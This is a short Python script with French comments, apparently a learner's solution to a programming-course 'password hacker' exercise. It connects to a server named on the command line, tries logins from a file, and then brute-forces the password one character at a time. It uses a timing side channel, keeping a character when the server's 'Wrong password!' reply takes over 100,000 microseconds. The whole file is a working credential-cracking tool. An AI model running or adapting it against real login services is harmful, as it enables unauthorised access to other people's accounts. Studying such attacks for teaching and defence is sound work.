# write your code here
import socket
import argparse
import string
import os
import json
import itertools
from datetime import datetime


# debug = True
lettres = list(string.ascii_letters) + list(string.digits)


parser = argparse.ArgumentParser()
parser.add_argument("server", help="Le serveur sur lequel se connecter")
parser.add_argument("port", help="Le port sur lequel se connecter")
args = parser.parse_args()
address = (args.server, int(args.port))


fichier_login = os.path.join(os.path.dirname(__file__),"logins.txt")
with open(fichier_login, 'r', encoding='utf-8') as f:
    login_list = f.readlines()

def pass_logger_generator():
    for i in itertools.product(lettres, repeat=1):
        yield "".join(i)

def comm_w_server(connex, credential):
    start = datetime.now()
    connex.send(json.dumps(credential).encode('utf-8'))
    rep = connex.recv(1024).decode('utf-8')
    stop = datetime.now()
    # if debug:
    #     ecrit_log(f'Envoi : {credential}\n')
    #     ecrit_log(f'Réponse : {dict(json.loads(rep))}\n')
    return {'result': json.loads(rep)['result'], 'time': (stop - start).microseconds}


def test_pwd(connex, login):
    credential = {'login': login, 'password': ''}
    while True:
        for lettre in pass_logger_generator():
            credential['password'] += lettre
            if len(credential['password']) < 11:
                rep = comm_w_server(connex, credential)
                # if (debug and rep['time'] > 100000) or (debug and rep['result'] == 'Connection success!'):
                #     ecrit_log(f'Envoi : {credential}\n')
                #     ecrit_log(f'Réponse : {rep}\n')
                if rep['result'] == 'Wrong password!':
                    if rep['time'] > 100000:
                        continue
                    else:
                        credential['password'] = credential['password'][:-1]
                        continue
                elif rep['result'] == 'Connection success!':
                    return json.dumps(credential)
            continue
        continue


def ecrit_log(chaine):
    with open(os.path.join(os.path.dirname(__file__), "envoi.txt"), "a+") as exp:
        exp.write(chaine)


with socket.socket() as connex:
    connex.connect(address)
    for login in login_list:
        credential = {"login": login.strip('\n'), "password": " "}
        reponse = comm_w_server(connex, credential)
        # if debug:
        #     ecrit_log(f'Test : {reponse["result"] == "Wrong password!"}\n')
        if reponse['result'] == 'Wrong password!':
            cred = test_pwd(connex, credential['login'])
            print(cred)
            exit()
